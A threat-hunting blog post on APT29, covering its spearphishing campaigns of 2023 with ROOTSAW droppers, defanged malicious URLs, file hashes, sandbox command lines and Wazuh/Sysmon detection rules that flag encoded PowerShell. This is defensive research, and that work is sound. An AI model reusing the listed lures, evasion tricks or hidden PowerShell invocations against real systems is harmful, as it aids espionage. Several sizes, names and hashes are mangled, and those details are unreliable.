---
title: "Full APT29 Hunting"
date: 2026-06-05 12:00:00 +0200
categories: [APT Hunting]
tags: [apt29, cozy-bear, threat-hunting, mitre-attack, kql, sysmon, wazuh, cobalt-strike, phishing, lsass, dfir, blue-team]
image:
  path: /assets/img/posts/apt29-hunting/img-001.png
  alt: "APT29 (Cozy Bear) threat-hunting lab report"
---

### Quick Review

This is a highly sophisticated Russian state-sponsored cyber espionage group believed to operate under the Russian Foreign Intelligence Service (SVR)

The SVR is the civilian foreign intelligence agency of Russia, which started work in December 1991.

The SVR is tasked with intelligence and espionage activities outside the Russian Federation

![](/assets/img/posts/apt29-hunting/img-001.png)

![](/assets/img/posts/apt29-hunting/img-002.png)

> **Ref:** <https://en.wikipedia.org/wiki/Foreign_Intelligence_Service_(Russia)>

### Known Names

Cozy Bear

The Dukes

IRON HEMLOCK

Nobelium

![](/assets/img/posts/apt29-hunting/img-003.png)

> **Ref:** <https://www.sekoia.io/en/glossary/apt29-aka-nobelium-cozy-bear/>

### What This Group Focuses On

Active since 2008, APT29 is notable for its advanced operational discipline, adaptability, and persistent targeting of well-defended organizations

The group’s primary objectives are cyber espionage against government agencies, political organizations, research institutions, and critical infrastructure.

Its motivation centers on gathering intelligence to support Russian foreign and security policy decision-making, disrupting national security, and influencing political processes

> **Ref:** <https://www.vectra.ai/modern-attack/threat-actors/apt29>

> **Ref:** <https://hedgehogsecurity.co.uk/blog/who-is-apt29>

### Most Targeted Countries

United States: Numerous government agencies (including during the SolarWinds hack), private sector companies, and NGOs ( https://www.sekoia.io/en/glossary/apt29-aka-nobelium-cozy-bear/)

United Kingdom: Government institutions, research organizations, and defense sectors

NATO Countries:

Germany

Norway

Poland

European Union States: Especially those with roles in foreign policy, diplomacy, or international affairs

![](/assets/img/posts/apt29-hunting/img-004.png)

> **Ref:** <https://cyble.com/threat-actor-profiles/apt-29/>

### Most Targeted Sectors

Media

Entertainment

Education

Energy

Healthcare, Pharmaceuticals and Biotechnology

Normal Government business

> **Ref:** <https://cyble.com/threat-actor-profiles/apt-29/>

### Most Common Used Techniques in MitreAtt&ck

## T1566.001 "Phishing: Spearphishing Attachment"

Falls Under Initial Access Category

This technique involves adversaries sending targeted phishing emails that contain malicious attachments,such as Office documents or executable files to trick users into opening them and thereby execute attacker-controlled code or install malware on the victim system:

![](/assets/img/posts/apt29-hunting/img-005.png)

![](/assets/img/posts/apt29-hunting/img-006.png)

> **Ref:** <https://attack.mitre.org/techniques/T1566/001/>

## T1059.001 "Command and Scripting Interpreter: PowerShell"

Adversaries use PowerShell Windows' built-in command-line shell and scripting language to execute malicious commands, scripts, or payloads for initial access, execution, discovery, persistence, or defense evasion

This technique lets attackers automate attacks, bypass security controls, and often operate in file less to avoid detection

![](/assets/img/posts/apt29-hunting/img-007.png)

![](/assets/img/posts/apt29-hunting/img-008.png)

> **Ref:** <https://attack.mitre.org/techniques/T1059/001/>

## T1053.005 "Scheduled Task/Job: Scheduled Task"

Adversaries abuse the Windows Task Scheduler to create or modify scheduled tasks for the initial or recurring execution of malicious code

Which helps achieve persistence, privilege escalation, or remote execution

This technique allows attackers to automate execution of payloads at specific times or system events, often evading detection by blending in with legitimate scheduled tasks

![](/assets/img/posts/apt29-hunting/img-009.png)

![](/assets/img/posts/apt29-hunting/img-010.png)

> **Ref:** <https://attack.mitre.org/techniques/T1053/005/>

## T1021.001 "Remote Services: Remote Desktop Protocol"

Adversaries use valid credentials to log into a remote system using RDP or Remote Desktop Services (RDS), allowing them to perform actions as the logged- on user and move laterally within the network

This technique facilitates interactive sessions with the remote system’s graphical interface, enabling attackers to expand access and control if the service is enabled and credentials are available or stolen

![](/assets/img/posts/apt29-hunting/img-011.png)

![](/assets/img/posts/apt29-hunting/img-012.png)

> **Ref:** <https://attack.mitre.org/techniques/T1021/001/>

## T1003.001 "OS Credential Dumping: LSASS Memory

This technique involves adversaries accessing credential material stored in the memory of the Local Security Authority Subsystem Service (LSASS) process on Windows systems

LSASS holds various credential data such as hashed or cleartext passwords after user logon

Attackers with administrative privileges or SYSTEM access may dump LSASS memory to extract these credentials and then use them for lateral movement or privilege escalation

![](/assets/img/posts/apt29-hunting/img-013.png)

> **Ref:** <https://attack.mitre.org/techniques/T1003/001/>

## T1071.001 "Application Layer Protocol: Web Protocols:"

This technique involves adversaries using common web-related application layer protocols such as HTTP, HTTPS, and WebSocket to communicate with compromised systems

The goal is to blend malicious Command-and-Control (C2) or data exfiltration traffic seamlessly with legitimate web traffic, making it harder for defenders to detect and block

![](/assets/img/posts/apt29-hunting/img-014.png)

![](/assets/img/posts/apt29-hunting/img-015.png)

> **Ref:** <https://attack.mitre.org/techniques/T1071/001/>

---

### Technical Side

## T1566.001 Phishing: SpearPhishing Attachment

ID: T1566.001

Sub-technique of: T1566

Tactic: Initial Access

Platforms: Linux, Windows, macOS

APT29 deployed this attack by sending spear phishing emails targeted at specific individuals or organizations

These emails contain malicious attachments such as Microsoft Office documents, executables, PDFs, or archived files

The attachments often exploit vulnerabilities or contain malicious payloads that execute when the user opens them

They typically disguises these attachments using social engineering tactics to make them appear legitimate and entice the victim to open them, sometimes instructing the victim on how to bypass system protections

![](/assets/img/posts/apt29-hunting/img-016.png)

What file types and lure themes APT29 used in past campaigns?

Executable files disguised with manipulated extensions or icons

PDFs

Archived files like ZIP or RAR (With Password to do exploits in archive handling )

HTML files containing JavaScript droppers implementing HTML smuggling

Image file formats such as ISO or IMG files containing mounted virtual drives with malicious Windows shortcut (LNK) files and DLLs

Remote Desktop Protocol configuration files

### Theories Used

Diplomatic and embassy related themes

Political party and election related lures

COVID-19 related content early in the pandemic ( Expired )

> **Ref:** <https://cloud.google.com/blog/topics/threat-intelligence/apt29-evolving->

> **Ref:** <https://cloud.google.com/blog/topics/threat-intelligence/tracking-apt29->

> **Ref:** <https://www.rnbo.gov.ua/files/2023_YEAR/CYBERCENTER/november/APT29%2>

### Campaigns Analysis

## March 2023: Earthquake-Themed Türkiye Campaign

In March 2023, Mandiant identified a new APT29 phishing campaign targeting Türkiye, which exploited the recent February 2023 earthquake disaster as a contextual lure. The attackers impersonated the Turkish Deputy Minister of Foreign Affairs and sent phishing emails containing a malicious link paired with earthquake-related content to increase plausibility

They Started this first wave by sending phishing mails contains URL "https://tinyurl[.]com/mrxcjsbs"

Hosted URL is Clean

![](/assets/img/posts/apt29-hunting/img-017.png)

URL isn't Clean

![](/assets/img/posts/apt29-hunting/img-018.png)

![](/assets/img/posts/apt29-hunting/img-019.png)

From Community: TinyURL.com _is_, and to my knowledge always has been, completely safe as long as it isn't performing its mission, its main reason for existence, which is to redirect links, to its customer-assigned subdirectories known as "tinyurls", to external locations. When it does fulfill its mission, just about anything can happen; in fact, in every spam email I receive that contains TinyURL links, those links infallibly obfuscate and redirect to malicious landing pages.

> **Ref:** <https://www.virustotal.com/gui/domain/tinyurl.com/community>

![](/assets/img/posts/apt29-hunting/img-020.png)

it used to redirect to a ROOTSAW dropper hosted on an actor- controlled compromised website "https://www[.]willyminiatures[.]com/e- yazi.htm/?v=bc78a8d162c6"

Dropper Name: e-yazi.htm

Dropped File Hash:
4527057000a4b06f000983b5b61cc85c10f03691fa17d5c51a9fd0b2428
0662d

![](/assets/img/posts/apt29-hunting/img-021.png)

it drops ISO File

ISO File: e-yazi.iso

Real File Name: a8jet3l1v.exe

File Hash:
948c62e8d953038b6a0030136cb82f55a8251db2c165ca07c01a7568f4
644240

Another Known Names:

4527057000a4b06f000983b5b61cc85c10f03691fa17d5c51a9fd0b24280662 d.bin output.229384142.txt

### Meta Data

Magic: HTML document, ASCII text, with very long lines (65356u)

Magika: HTML

File Size: 4.09 MB (4288788 bytes)

First Seen In The Wild: 2023-03-28 13:57 UTC (VT)

Then they go to second wave:

Victims were again directed to an actor-controlled compromised website "https://simplesalsamix[.]com/e-yazi.html"

![](/assets/img/posts/apt29-hunting/img-022.png)

Redirect to Download ROOTSAW dropper "e-yazi.html"

File Name: e-yazi.html

Real File Name: download.html

File Hash:
cd4956e4c1a3f7c8c008c4658bb9eba7169aa874c55c12fc748b0ccfe0f4
a59a

### Meta Data

Magic HTML document, ASCII text, with very long lines (65343u)

Magika: HTML
File size: 1.02 MB (1066185 bytes)

it can dropped also by ZIP File

File Name: e-yazi.zip

Real File Name: a557245e-c62a-433c-8df9-c2d6f0819d7d.tmp

File Hash:
0dd55a234be8e3e07b0eb19f47abe594295889564ce6a9f6e8cc4d
3997018839

ROOTSAW Analysis:

tria.ge Score 5/10

![](/assets/img/posts/apt29-hunting/img-023.png)

### File Targets

e-yazi.pdf e-yazi.docx.exe ( Double Extension File, Might Used in Phishing )

Mso20Win32Client.DLL

AppvIsvSubsystems64.dll

![](/assets/img/posts/apt29-hunting/img-024.png)

### CommandLines on AppvIsvSubsystems64.dll

rundll32.exe C:\Users\Admin\AppData\Local\Temp\AppvIsvSubsystems64.dll,#1

C:\Windows\system32\WerFault.exe -pss -s 188 -p 2516 -ip 2516

C:\Windows\system32\WerFault.exe -u -p 2516 -s 224

Process Tree: rundll32.exe > AppvIsvSubsystems64.dll OR WerFault.exe > rundll32.exe > AppvIsvSubsystems64.dll

File Located in " C:\Users\

[User]\AppData\Local\Temp\AppvIsvSubsystems64.dll "

![](/assets/img/posts/apt29-hunting/img-025.png)

CommandLines on e-yazi.pdf: -

![](/assets/img/posts/apt29-hunting/img-026.png)

Once file opened all below executions done

C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroRd32.exe

```
"C:\Program Files (x86)\Adobe\Acrobat Reader
DC\Reader\AcroRd32.exe"
"C:\Users\Admin\AppData\Local\Temp\e-yazi.pdf"
```

C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroCEF\RdrCEF.exe" --backgroundcolor=16514043

C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroCEF\RdrCEF.exe" --type=gpu-process --disable- pack-loading --lang=en-US --log-file="C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroCEF\debug.log" -- log-severity=disable --product- version="ReaderServices/19.10.20064 Chrome/64.0.3282.119" -- gpu-preferences=GAAAAAAAAAAAB4AAAQAAAAAAAAAAAGAA --use-gl=swiftshader-webgl --gpu-vendor-id=0x1234 --gpu-device- id=0x1111 --gpu-driver-vendor="Google Inc." --gpu-driver- version=3.3.0.2 --gpu-driver-date=2017/04/07 --disable-pack- loading --lang=en-US --log-file="C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroCEF\debug.log" -- log-severity=disable --product- version="ReaderServices/19.10.20064 Chrome/64.0.3282.119" -- service-request-channel- token=304692D19934435CC2B082688E506469 --mojo-platform- channel-handle=1728 --allow-no-sandbox-job --ignored=" -- type=renderer " /prefetch:2

C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroCEF\RdrCEF.exe" --type=renderer --disable- browser-side-navigation --disable-gpu-compositing --service-pipe- token=9E871AFBE76B099FF0CD04A4DD99AB81 --lang=en-US - -disable-pack-loading --lang=en-US --log-file="C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroCEF\debug.log" -- log-severity=disable --product- version="ReaderServices/19.10.20064 Chrome/64.0.3282.119" -- enable-pinch --device-scale-factor=1 --num-raster-threads=2 -- enable-main-frame-before-activation --enable-gpu-async-worker- context --content-image-texture- target=0,0,3553;0,1,3553;0,2,3553;0,3,3553;0,4,3553;0,5,3553;0, 6,3553;0,7,3553;0,8,3553;0,9,3553;0,10,3553;0,11,3553;0,12,355 3;0,13,3553;0,14,3553;0,15,3553;0,16,3553;0,17,3553;0,18,3553; 1,0,3553;1,1,3553;1,2,3553;1,3,3553;1,4,3553;1,5,3553;1,6,3553; 1,7,3553;1,8,3553;1,9,3553;1,10,3553;1,11,3553;1,12,3553;1,13,3 553;1,14,3553;1,15,3553;1,16,3553;1,17,3553;1,18,3553;2,0,355 3;2,1,3553;2,2,3553;2,3,3553;2,4,3553;2,5,3553;2,6,3553;2,7,355 3;2,8,3553;2,9,3553;2,10,3553;2,11,3553;2,12,3553;2,13,3553;2,1 4,3553;2,15,3553;2,16,3553;2,17,3553;2,18,3553;3,0,3553;3,1,35 53;3,2,3553;3,3,3553;3,4,3553;3,5,3553;3,6,3553;3,7,3553;3,8,35 53;3,9,3553;3,10,3553;3,11,3553;3,12,3553;3,13,3553;3,14,3553; 3,15,3553;3,16,3553;3,17,3553;3,18,3553;4,0,3553;4,1,3553;4,2, 3553;4,3,3553;4,4,3553;4,5,3553;4,6,3553;4,7,3553;4,8,3553;4,9, 3553;4,10,3553;4,11,3553;4,12,3553;4,13,3553;4,14,3553;4,15,35 53;4,16,3553;4,17,3553;4,18,3553;5,0,3553;5,1,3553;5,2,3553;5, 3,3553;5,4,3553;5,5,3553;5,6,3553;5,7,3553;5,8,3553;5,9,3553;5, 10,3553;5,11,3553;5,12,3553;5,13,3553;5,14,3553;5,15,3553;5,16

,3553;5,17,3553;5,18,3553;6,0,3553;6,1,3553;6,2,3553;6,3,3553; 6,4,3553;6,5,3553;6,6,3553;6,7,3553;6,8,3553;6,9,3553;6,10,355 3;6,11,3553;6,12,3553;6,13,3553;6,14,3553;6,15,3553;6,16,3553; 6,17,3553;6,18,3553 --disable-accelerated-video-decode -- service-request-channel- token=9E871AFBE76B099FF0CD04A4DD99AB81 --renderer- client-id=2 --mojo-platform-channel-handle=1740 --allow-no- sandbox-job /prefetch:1

C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroCEF\RdrCEF.exe" --type=gpu-process --disable- pack-loading --lang=en-US --log-file="C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroCEF\debug.log" -- log-severity=disable --product- version="ReaderServices/19.10.20064 Chrome/64.0.3282.119" -- gpu-preferences=GAAAAAAAAAAAB4AAAQAAAAAAAAAAAGAA --use-gl=swiftshader-webgl --gpu-vendor-id=0x1234 --gpu-device- id=0x1111 --gpu-driver-vendor="Google Inc." --gpu-driver- version=3.3.0.2 --gpu-driver-date=2017/04/07 --disable-pack- loading --lang=en-US --log-file="C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroCEF\debug.log" -- log-severity=disable --product- version="ReaderServices/19.10.20064 Chrome/64.0.3282.119" -- service-request-channel- token=CBE6FFF9C1CF83457362879D39EB229F --mojo- platform-channel-handle=2316 --allow-no-sandbox-job --ignored=" --type=renderer " /prefetch:2

C:\Windows\System32\CompPkgSrv.exe -Embedding

Process Tree: e-yazi.pdf > AcroRd32.exe > RdrCEF.exe > Other

### Commands

### CommandLines on e-yazi.docx .exe

C:\Users\Admin\AppData\Local\Temp\e-yazi.docx.exe sihost.exe taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}

![](/assets/img/posts/apt29-hunting/img-027.png)

### How Does Malware Affect the Victim

APT29 incorporated a new version of its ROOTSAW dropper that includes enhanced anti-analysis and evasion capabilities to improve its success rate and avoid detection. The key features of this updated variant are User-Agent Filtering : The dropper checks the user-agent string of the connecting device. It specifically looks for systems running a Windows operating system, identified by the "Windows NT" value, while also ensuring the string does not contain ".NET"

Decoy File Delivery : If the target system does not meet these specific criteria (i.e., it is a non-Windows OS or the request comes from a.NET environment), the server delivers a benign decoy PDF file instead of the malicious payload. This tactic is designed to thwart automated analysis tools and sandboxes, which often do not run on standard Windows configurations, thus preventing them from capturing the actual malware

Consistent Decoys : In one of the observed campaign waves, the decoy PDF served to filtered-out targets was identical to the one included in the malicious ZIP payload intended for valid targets. This maintains consistency and reduces suspicion

Payload Obfuscation : Each malicious payload within the ROOTSAW dropper is obfuscated using a unique key. While the keys are different for each payload, the deobfuscation routine remains the same, adding a layer of complexity for analysts attempting to reverse-engineer the malware

![](/assets/img/posts/apt29-hunting/img-028.png)

## March 2023: European Diplomatic-Focused Phishing Campaigns

Also in March 2023, APT29 targeted various diplomatic missions in Europe in the two weeks that lapsed between the Turkey campaign, further changes were identified resulting in two new variants of ROOTSAW that shifted the newly added anti-analysis guardrails server side

They sent a mail contained PDF file, this mails asks user for invitation to a drink reception following an event on the "Future of International Economic Relations"

This PDF Contains a Link to malicious web site hosted the ROOTSAW on "https[]:]//parquesanrafael[.]cl/note.html"

![](/assets/img/posts/apt29-hunting/img-029.png)

![](/assets/img/posts/apt29-hunting/img-030.png)

![](/assets/img/posts/apt29-hunting/img-031.png)

Last Update on "2024-12-31 10:00 AM"

This URL will convert user to download file below:

File Name: Note.pdf

File Hash:
46c8289301129c0833529495f4f3748b5adff78e18f1427654cb3b59735
2873e (Highly Reported)

Magic: PDF document, version 1.5, 1 pages

Magika: PDF

File Size: 59.70 KB (61135 bytes)

![](/assets/img/posts/apt29-hunting/img-032.png)

This is Edited Version of ROOTSAW that sends the victim’s user-agent to the compromised server using an HTTP GET request “https://parquesanrafael[.]cl/note.php?ua=”

The server then performs filtering based on an actor-defined deny-list, finally returning a decryption key for the payload if the tests are successfully passed

If these tests fail, ROOTSAW drops a corrupt file, rather than exposing the embedded decoy file like in previous versions

Second Wave: its the same with simple addition a new variant of ROOTSAW containing both user-agent and IP filtering, but ultimately leading to the same MUSKYBEAT downloader

File Name: note.html

File Name:
92a5be2893743435b79e94aa64a74233a2240fd790ca948e1cb046da5b407
2f1_JC.html

File Hash:
92a5be2893743435b79e94aa64a74233a2240fd790ca948e1cb046da5b407
2f1 ( Reported )

Magic: HTML document, ASCII text, with very long lines (64557u)

Magika: HTML

File Size: 3.42 MB (3587003 bytes)

### File Execution Details

Score on tria.ge

![](/assets/img/posts/apt29-hunting/img-033.png)

### CommandLines

C:\Program Files\Internet Explorer\iexplore.exe "C:\Program Files\Internet Explorer\iexplore.exe" C:\Users\Admin\AppData\Local\Temp\92a5be2893743435b79e94 aa64a74233a2240fd790ca948e1cb046da5b4072f1_JC.html

C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE

"C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE" SCODEF:2288 CREDAT:275457 /prefetch:2

![](/assets/img/posts/apt29-hunting/img-034.png)

![](/assets/img/posts/apt29-hunting/img-035.png)

![](/assets/img/posts/apt29-hunting/img-036.png)

![](/assets/img/posts/apt29-hunting/img-037.png)

![](/assets/img/posts/apt29-hunting/img-038.png)

![](/assets/img/posts/apt29-hunting/img-039.png)

![](/assets/img/posts/apt29-hunting/img-040.png)

## April 2023: Old Wine in a New Bottle

This was the open gate for new technique for malware delivery

They re-used one its frequent diplomatic event-themed lure documents spoofing the Czechia Embassy Known in Czech

The invitation targets to a wine tasting event on April 13, 2023

![](/assets/img/posts/apt29-hunting/img-041.png)

the drafted document contained a link to the phishing website " https[:]//sylvio[.]com[.]br/form.php "

delivered either an ISO or a ZIP archive to the victim

Technique here focuses on sending the malware directly from malicious web server also they removed any HTML smuggling to reduce the number of forensic artifacts left on the host that are prone to detection or later analysis by any detection teams

![](/assets/img/posts/apt29-hunting/img-042.png)

![](/assets/img/posts/apt29-hunting/img-043.png)

File Name: Wine event.pdf

File Hash:
62ce8e1489a8b87539792c07179faf1db1b46caa39b55902a4d82dcec44d72
ae ( Highly Reported )

Magic: PDF document, version 1.5, 1 pages

Magika: PD

File size: 61.53 KB (63011 bytes)

First Seen In The Wild: 2023-04-06 16:43:48 UTC

![](/assets/img/posts/apt29-hunting/img-044.png)

![](/assets/img/posts/apt29-hunting/img-045.png)

![](/assets/img/posts/apt29-hunting/img-046.png)

![](/assets/img/posts/apt29-hunting/img-047.png)

tria.ge score

![](/assets/img/posts/apt29-hunting/img-048.png)

### Commands

```
C:\Program Files (x86)\Adobe\Reader 9.0\Reader\AcroRd32.exe
"C:\Program Files (x86)\Adobe\Reader 9.0\Reader\AcroRd32.exe"
"C:\Users\Admin\AppData\Local\Temp\62ce8e1489a8b87539792c0717
9faf1db1b46caa39b55902a4d82dcec44d72ae.pdf"
```

C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroCEF\RdrCEF.exe"C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroCEF\RdrCEF.exe" -- backgroundcolor=16514043

C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroCEF\RdrCEF.exe

"C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroCEF\RdrCEF.exe" --type=gpu-process --disable- pack-loading --lang=en-US --log-file="C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroCEF\debug.log" -- log-severity=disable --product- version="ReaderServices/19.10.20064 Chrome/64.0.3282.119" -- gpu-preferences=GAAAAAAAAAAAB4AAAQAAAAAAAAAAAGAA --use-gl=swiftshader-webgl --gpu-vendor-id=0x1234 --gpu-device- id=0x1111 --gpu-driver-vendor="Google Inc." --gpu-driver- version=3.3.0.2 --gpu-driver-date=2017/04/07 --disable-pack- loading --lang=en-US --log-file="C:\Program Files (x86)\Adobe\Acrobat Reader DC

## May 2023: Ukraine Foreign Embassy-Focused Campaigns

in the lead up to Ukraine’s counteroffensive, APT29 conducted two distinct phishing waves targeting a wide range of diplomatic representations in Kyiv, including those of Moscow’s partners. Each campaign adopted separate intrusion chains similar to those seen in March and April 2023 first wave in early may, An repurposed advertisement for a BMW for sale in Kyiv a Polish diplomat sent a legitimate email to various embassies advertising a used BMW for sale in Kyiv, APT29 intercepted this flyer and repurposed it for a phishing attack as way to download "bmw.iso"

The version of the ROOTSAW malware used in the May 2023 BMW-themed phishing campaign in Kyiv shared similarities with variants deployed in March 2023 against Türkiye. Both campaigns, attributed to the Russian- backed group APT29, utilized a dropper malware named ROOTSAW and incorporated user-agent filtering to evade detection and analysis

A key feature of these campaigns was the use of user-agent filtering to determine what content would be delivered to the target. The malware would check the user-agent string of the device making the request to identify its operating system and other characteristics

In the Türkiye Campaign (March 2023): The ROOTSAW variant checked for Windows operating systems that did not contain ".NET" and included the value "Windows NT" in the user-agent string. If the target's system did not meet these criteria, such as a non-Windows OS or a request made through.NET, the server would deliver a decoy PDF file instead of the malicious payload. This tactic helped the attackers avoid automated analysis tools and non-compatible devices

In the Kyiv BMW Campaign (May 2023): A similar user-agent filtering mechanism was employed. Depending on the user-agent of the potential victim, the server would either deliver the weaponized ISO file ( bmw.iso ) or a harmless decoy image of the BMW being advertised

File Name: bmw.iso

File Hash: e306333093eaf198f4d416d25a40784a (Highly Reported)

Magic: ISO 9660 CD-ROM filesystem data 'CDROM'

Magika: ISO

File size: 7.59 MB (7960576 bytes)

tria.ge score:

![](/assets/img/posts/apt29-hunting/img-049.png)

### Targets

AppvIsvSubsystems64.dll

MSVCP140.dll

Mso20Win32Client.DLL windoc.exe bmw1.png.lnk

### CommandLines

cmd /c C:\Users\Admin\AppData\Local\Temp\bmw1.png.lnk

"C:\Windows\System32\conhost.exe" cmd /c start.$Recycle.Bin\windoc.exe && ".$Recycle.Bin\bmw1.png"

cmd /c start.$Recycle.Bin\windoc.exe &&.$Recycle.Bin\bmw1.png

.$Recycle.Bin\windoc.exe

Process Tree: bmw1.png.lnk > cmd.exe > conhost.exe > windoc.exe

![](/assets/img/posts/apt29-hunting/img-050.png)

### Second Wave

In mid-May 2023, the Russian-backed threat group APT29 launched a second wave of phishing attacks targeting diplomatic entities in Kyiv. This campaign followed an earlier attack that used a repurposed advertisement for a BMW. The second wave used an invitation to a charity concert as a lure and, like the previous campaign, likely involved the use of a copy of a legitimate document

The attackers sent emails containing a file with the misspelled name " Invintation.zip "

The payloads for this attack were hosted on actor controlled infrastructure setup used user-agent filtering to selectively deliver either a ZIP file containing decoy PDF documents or a different ZIP file with second-stage malware payloads

These operations were part of a broader effort by the group to target diplomatic missions in Ukraine in the period leading up to the country's counteroffensive

![](/assets/img/posts/apt29-hunting/img-051.png)

File Name: Invintation.zip

File Hash: 38719acc6254b7ff70dc8a7723bd8e92

That's All what i could find about this file, will update if i found something

Payload Name:

Payload Hash: 1aee5bf23edb7732fd0e6b2c61a959ce

Downloaded From: https//gavice.ng/event_program.php

![](/assets/img/posts/apt29-hunting/img-052.png)

![](/assets/img/posts/apt29-hunting/img-053.png)

### All Dropped Files

2d794d1544f933aacbd8da2dad78b381

5569fb4e9140974a80b4b7587b026913 (BURNTBATTER)

1c0059d976795ceded7c1dd706e74bd1

595d8ea258ef8d8ec70b0e8a740e903c (DONUT)

invitation_letter_and_programme_17.05.2023_en.pdf.exe invitation_letter_and_programme_17.05.2023_ua.pdf.exe

## June 2023: Split ROOTSAW Campaign

In late June 2023 APT29 conducted a phishing campaign against a European government using a new variant of the ROOTSAW malware. The operation, dubbed the "Split ROOTSAW Campaign," employed novel delivery methods and evasion techniques

Phishing emails were sent from a compromised North American government email address. The emails were disguised as an invitation to a public holiday celebration from Norwegian embassy staff to target a European government

APT29 hosted the ROOTSAW payload on a compromised WordPress server

To evade detection, the server was configured to return a generic HTTP 404 error to non-valid targets, rather than the standard WordPress 404 error. Madinat noted that this tactic would likely hide the activity from WordPress level logs, though evidence might still exist in the underlying web server logs version of ROOTSAW delivered via the SVG file was a primitive variant, similar to those first seen in 2021. It lacked the anti-analysis features and hardening seen in more recent versions. This reversion to a simpler payload is consistent with APT29's pattern of using less sophisticated malware when experimenting with new delivery techniques

### PDF Mechanism

File Name: reception.pdf

File Hash:
a8b56b51e085955b5641a9cb74c3b66ee5c37d62703f28b01cfbf7122a
7edbfa

Magic: PDF document, version 1.5, 1 pages

File Size: 25.23 KB (25839 bytes)

First Seen In The Wild: 2023-06-23 10:40:26 UTC

Emails with an attached Scalable Vector Graphic (SVG) file:

File Name: __substg1.0_37010102

File Hash:
4875a9c4af3044db281c5dc02e5386c77f331e3b92e5ae79ff9961d8cd1f
7c4f

Magic: SVG Scalable Vector Graphics image

Magika: SVG

File Size: 61 MB (2737155 bytes)

invitation.svg

![](/assets/img/posts/apt29-hunting/img-054.png)

![](/assets/img/posts/apt29-hunting/img-055.png)

![](/assets/img/posts/apt29-hunting/img-056.png)

![](/assets/img/posts/apt29-hunting/img-057.png)

![](/assets/img/posts/apt29-hunting/img-058.png)

## July 2023: ICEBEAT Campaign

In July 2023, APT29 continued to evolve its tactics by deploying a new downloader called ICEBEAT and using a PDF document to deliver its ROOTSAW malware for the first time

This campaign targeted European diplomatic entities with a phishing lure disguised as an invitation to a German embassy event

Emails purported to be an invitation from a German embassy for an Ambassador’s farewell reception

This was the first observed instance of APT29 embedding its ROOTSAW malware loader within a PDF document. When opened, the PDF would write an HTML file to the disk. Launching this HTML file then created a ZIP file and initiated a connection to an attacker-controlled domain ( https://sgrfh[.]org.pk/wp-content/idx.php?n=ks&q= ) to profile the victim's system

ICEBEAT downloader used the open-source Zulip messaging platform for its command and control communications. This tactic is consistent with APT29's established pattern of abusing legitimate services for C2, which has previously included Dropbox, Firebase, OneDrive, and Trello. ICEBEAT was responsible for downloading subsequent payloads from the Zulip service

![](/assets/img/posts/apt29-hunting/img-059.png)

### File Details

File Name: reception.pdf

File Hash:
a8b56b51e085955b5641a9cb74c3b66ee5c37d62703f28b01cfbf7122a
7edbfa

Magic: PDF document, version 1.5, 1 pages

File Size: 25.23 KB (25839 bytes)

First Seen In The Wild: 2023-06-23 10:40:26 UTC
-

![](/assets/img/posts/apt29-hunting/img-060.png)

![](/assets/img/posts/apt29-hunting/img-061.png)

### Detection Steps

First lets create rules to detect macro came from any.office file

Install Sysmon in ur agent

Check this ref to create rules by XML: https://documentation.wazuh.com/current/user-manual/ruleset/ruleset-xml- syntax/rules.html

```
<group name="local-phishing-attachment">
<!-- 1. ProcessCreate: Office app spawns a scripting/powershell
process -->
<rule id="200001" level="12">
<if_group>sysmon,</if_group>
<match>ParentImage: .*\\(winword|excel|powerpnt|outlook)\.exe</match>
<match>Image: .*\\
(powershell|pwsh|wscript|cscript|cmd|rundll32)\.exe</match>
<description>Possible macro / attachment execution: Office spawned
scripting / powershell</description>
</rule>
```

```
<!-- 2. CommandLine contains encoded/obfuscated powershell or
suspicious flags -->
<rule id="200002" level="12">
<if_group>sysmon,</if_group>
<match>CommandLine: .*(-EncodedCommand|-enc|iex|IEX )</match>
<description>Potential encoded/obfuscated PowerShell seen (often used
by malicious macros)</description>
</rule>
```

```
<!-- 3. FIM: new suspicious attachment file added (docm, xlsm, vbs,
js) -->
<rule id="200003" level="10">
<if_group>syscheck,</if_group>
<match>added</match>
<match>\.(docm|xlsm|pptm|vbs|js|hta)$</match>
<description>Suspicious attachment file added to monitored
folder</description>
```

```
</rule>
</group>
```

### Goal

Simulate a Sysmon / Windows Event that matches the behavior of opening a malicious attachment ( winword.exe or excel.exe spawning powershell / wscript ) and feed that event into Wazuh using wazuh-logtest.

Or perform a safe FIM test by creating a suspicious-named file (e.g., invoice_malicious.docm ) in a monitored folder and verify Wazuh generates an added alert. Both methods are safe (no real macro execution).

### What we will detect

Office process spawning scripting/Powershell (child process) indicates a macro or attachment executing code.

Suspicious PowerShell flags (e.g., -EncodedCommand, -enc, iex ) in CommandLine.

FIM: new files with macro/script extensions (.docm,.xlsm,.pptm,.vbs,.js, .hta ).

### Events

Event Description

WinEvent 4688 Process Creation (word.exe → powershell.exe)

WinEvent 4104 PowerShell Script Block Logging

WinEvent 7 (Sysmon) ImageLoaded (VBA loads weird DLL)

Sysmon 1 Process creation

Sysmon 11 File Create (macro dropped.exe)

Sysmon 3 Network connection (powershell to attacker)

Sysmon 6 Driver loaded (rare cases)

### Deep Investigation

### Observable Indicators

WINWORD.EXE => powershell.exe

WINWORD.EXE => mshta.exe

WINWORD.EXE => regsvr32.exe

Outlook.exe => Winword.exe

Macro writes to:

%APPDATA%\Microsoft\

%LOCALAPPDATA%\Temp\

%ProgramData%\ (rare)

Macro drops file:.exe |.js |.vbs |.dll

PowerShell hidden/noninteractive:

powershell.exe -nop -w hidden

### Sample

i will use crafted sample of phishing mail came from this APT Group:

![](/assets/img/posts/apt29-hunting/img-062.png)

